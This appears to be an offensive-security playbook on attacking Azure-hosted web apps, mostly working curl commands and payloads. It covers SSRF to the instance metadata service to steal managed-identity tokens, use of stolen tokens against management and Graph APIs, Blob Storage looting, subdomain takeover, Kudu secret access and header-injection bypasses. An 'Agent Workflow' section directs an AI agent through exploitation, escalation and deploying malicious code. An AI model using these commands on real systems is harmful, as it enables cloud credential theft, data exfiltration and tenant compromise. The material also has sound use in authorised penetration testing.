# Azure Web Attacks

> **Summary**: Exploitation of Azure-specific services and misconfigurations reachable through web application vulnerabilities.
> **Impact**: Credential theft via managed identity, data exfiltration from Blob Storage, Azure AD tenant compromise, subdomain takeover.
> **Typical Severity**: High | Critical

## Detection
### Indicators
- Application making calls to `169.254.169.254` (Azure IMDS)
- Azure-specific domains in source: `*.blob.core.windows.net`, `*.azurewebsites.net`, `*.azure-api.net`
- Azure AD tenant IDs or client IDs in client-side JavaScript
- Headers revealing Azure hosting: `x-ms-request-id`, `x-azure-ref`

### Automated Detection
```bash
# Enumerate Azure resources
cloud_enum -k <COMPANY_NAME> -l azure_results.txt

# Check for exposed Azure Blob containers
https://<STORAGE_ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list

# Azure tenant recon
trevorspray --recon <TARGET_DOMAIN>
```

### Manual Detection
1. Check DNS records for CNAME entries pointing to `*.azurewebsites.net`, `*.cloudapp.azure.com`, `*.trafficmanager.net`
2. Inspect JavaScript for Azure SDK config (tenant ID, client ID, API scopes)
3. Look for `/.well-known/openid-configuration` on Azure AD endpoints
4. Test `https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration` to confirm Azure AD usage

## Exploitation
### Prerequisites
- Web application hosted on Azure (App Service, Functions, AKS, VMs)
- SSRF vulnerability or exposed Azure configuration
- For Azure AD attacks: exposed tenant/client IDs or misconfigured multi-tenant app

### Step-by-Step

#### 1. SSRF to Azure IMDS (Managed Identity)

Azure Instance Metadata Service requires the `Metadata: true` header:

```bash
# 1. Get access token for the managed identity
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 2. Instance metadata
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 3. Get token for other resources
# Key Vault
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Storage
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

# Microsoft Graph
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
```

> The `Metadata: true` header requirement makes SSRF harder but not impossible -- header injection in the SSRF vector or redirect-based approaches may bypass this.

#### 2. Using Stolen Tokens

```bash
# Use the Bearer token with Azure REST APIs
TOKEN="<STOLEN_ACCESS_TOKEN>"

# List subscriptions
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# List resource groups
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/resourceGroups?api-version=2021-04-01"

# List storage accounts
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/providers/Microsoft.Storage/storageAccounts?api-version=2021-04-01"

# Azure CLI alternative
az login --identity  # if on the compromised VM
az account list
az storage account list
```

#### 3. Blob Storage Misconfiguration

```bash
# Check for anonymous access on a container
curl "https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list"

# Download a blob
curl "https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>/<BLOB_NAME>"

# Enumerate storage accounts by brute-forcing names
# Common patterns: <company>storage, <company>data, <company>backup
curl -s "https://<GUESS>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list"
```

#### 4. Azure AD Misconfiguration

```bash
# Check if tenant is multi-tenant (allows external login)
az ad sp show --id <CLIENT_ID>

# Enumerate users if app has User.Read.All
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users"

# Check for app registrations with excessive permissions
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications"
```

#### 5. Azure Subdomain Takeover

Dangling DNS records pointing to deprovisioned Azure services:

```bash
# Common vulnerable Azure service CNAMEs
*.azurewebsites.net          # App Services
*.cloudapp.azure.com         # Cloud Services
*.azure-api.net              # API Management
*.azurefd.net                # Azure Front Door
*.blob.core.windows.net      # Blob Storage
*.azureedge.net              # Azure CDN
*.trafficmanager.net         # Traffic Manager
*.azurecontainer.io          # Container Instances

# If the CNAME exists but the Azure resource is deleted,
# register the same resource name in your own Azure tenant
```

### Payloads

#### SSRF Metadata Payloads
```
# Azure IMDS (requires Metadata: true header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# App Service specific
# Environment variables often contain secrets
GET /env  (if Kudu/SCM is exposed)
https://<APP>.scm.azurewebsites.net/env

# Azure Functions
https://<APP>.azurewebsites.net/admin/host/keys
```

### Proof of Concept

SSRF to Managed Identity token theft:
1. Identify SSRF in `https://<TARGET>/api/proxy?url=`
2. Craft request with `Metadata: true` header (requires header injection)
3. Request `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`
4. Extract `access_token` from JSON response
5. Use token to call `https://management.azure.com/subscriptions?api-version=2020-01-01`

## Bypasses
- **Header injection for Metadata: true**: CRLF injection or parameter pollution to add the required header
- **Redirect-based SSRF**: Some proxies follow redirects and add no headers, but Azure IMDS still requires `Metadata: true` -- combine with header injection
- **Alternative endpoints for App Service**: The Kudu SCM endpoint (`<APP>.scm.azurewebsites.net`) may be exposed and contain environment variables with secrets
- **DNS rebinding**: Works similarly to AWS, resolve to `169.254.169.254` after initial check

## Escalation
- From Managed Identity token: enumerate Azure RBAC roles, pivot to Key Vault secrets, access storage accounts
- From Blob Storage write: overwrite application code, inject malicious content, modify ARM templates
- From Azure AD: escalate via application consent phishing, service principal abuse, or directory role assignment
- From App Service: access Kudu console for RCE, read environment variables, access mounted storage

## Tools
| Tool | Usage |
|------|-------|
| [cloud_enum](https://github.com/initstring/cloud_enum) | `cloud_enum -k <COMPANY>` -- Multi-cloud resource enumeration |
| [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray) | `trevorspray --recon <DOMAIN>` -- Azure tenant recon and password spraying |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Multi-cloud security auditing |
| [ROADtools](https://github.com/dirkjanm/ROADtools) | Azure AD exploration and enumeration |
| [MicroBurst](https://github.com/NetSPI/MicroBurst) | Azure security assessment PowerShell toolkit |
| [az cli](https://learn.microsoft.com/en-us/cli/azure/) | `az ad sp show --id <ID>` -- Official Azure CLI |
| [Stormspotter](https://github.com/Azure/Stormspotter) | Azure Red Team graph visualization |
| [TokenTactics](https://github.com/rvrsh3ll/TokenTactics) | Azure JWT token manipulation and abuse |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for Azure-specific web vulnerabilities.

### Phase 1: Detection
1. Check for Azure indicators in the target application:
   - Response headers: `x-ms-request-id`, `x-azure-ref`, `x-ms-version`
   - Domains: `*.azurewebsites.net`, `*.blob.core.windows.net`, `*.azure-api.net`, `*.cloudapp.azure.com`
   - JavaScript: Azure AD tenant IDs, client IDs, MSAL configuration
2. Confirm Azure AD usage:
   ```
   curl -s "https://login.microsoftonline.com/<TARGET_DOMAIN>/.well-known/openid-configuration"
   ```
3. Check DNS CNAME records for Azure service patterns
4. Test for SSRF endpoints that could reach `169.254.169.254` (Azure IMDS)

### Phase 2: Exploitation
1. **SSRF to Azure IMDS** (requires `Metadata: true` header):
   ```
   http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
   ```
2. **Blob Storage testing**:
   ```
   curl "https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list"
   ```
3. **Subdomain takeover** (check for dangling CNAME records):
   - Resolve CNAMEs pointing to `*.azurewebsites.net`, `*.cloudapp.azure.com`, `*.trafficmanager.net`
   - If the Azure resource is deleted but CNAME remains, register the resource name
4. **Using stolen tokens**:
   ```
   curl -H "Authorization: Bearer <TOKEN>" "https://management.azure.com/subscriptions?api-version=2020-01-01"
   ```

### Phase 3: Analysis
1. If managed identity token obtained:
   - List subscriptions and resource groups
   - Check access to Key Vault secrets, storage accounts, databases
   - Enumerate Azure RBAC role assignments
2. If Blob Storage is accessible:
   - Search for configuration files, backups, and sensitive data
   - Check for write access to overwrite application assets
3. Check for Kudu/SCM endpoint exposure: `<APP>.scm.azurewebsites.net`
4. Document the attack chain from initial access to data/resource access

### Phase 4: Next Steps
- If managed identity token: enumerate all Azure services accessible
- If Blob Storage write: test for code injection via asset overwrite
- If Azure AD misconfigured: test for user enumeration via Microsoft Graph
- If Kudu exposed: access environment variables and deploy malicious code
- Cross-reference with [SSRF](../vulns/ssrf.md) and [subdomain takeover](../vulns/subdomain-takeover.md)

## Decision Tree

```
START: Azure hosting confirmed (headers, domains, Azure AD)
  |
  +--> SSRF vulnerability present?
  |      |
  |      +--> Header injection possible? --> Add Metadata: true --> Steal managed identity token
  |      +--> No header control? --> Try redirect-based SSRF
  |
  +--> Blob Storage containers discovered?
  |      |
  |      +--> Anonymous listing? --> Enumerate and download
  |      +--> Anonymous write? --> Test asset overwrite
  |
  +--> Dangling CNAME records found?
  |      |
  |      +--> Azure resource deleted? --> Subdomain takeover
  |
  +--> Kudu/SCM endpoint exposed?
  |      |
  |      +--> Access /env for secrets --> RCE via deployment
  |
  +--> Token obtained? --> Enumerate Azure resources --> Escalate
```

## Success Criteria

- [ ] Azure hosting indicators identified (headers, domains, Azure AD config)
- [ ] SSRF tested against Azure IMDS with Metadata header
- [ ] Blob Storage containers tested for anonymous access
- [ ] DNS records checked for dangling CNAMEs (subdomain takeover)
- [ ] Kudu/SCM endpoint checked for exposure
- [ ] Stolen tokens used to enumerate accessible resources
- [ ] Attack chain documented from initial access to impact

## References
- [Azure Subdomain Takeover for CDN](https://onetrick.io/2019/09/28/subdomain-takeover-for-azure-cdn/)
- [Azure Services by Domain](https://learn.microsoft.com/en-us/azure/security/fundamentals/azure-domains)
- [Azure IMDS Documentation](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [Hacking the Cloud -- Azure](https://hackingthe.cloud/azure/general-knowledge/intro_metadata_service/)
- [Azure Penetration Testing](https://book.hacktricks.xyz/pentesting-cloud/azure-security)

**See also**: [SSRF](../vulns/ssrf.md) | [Subdomain Takeover](../vulns/subdomain-takeover.md)
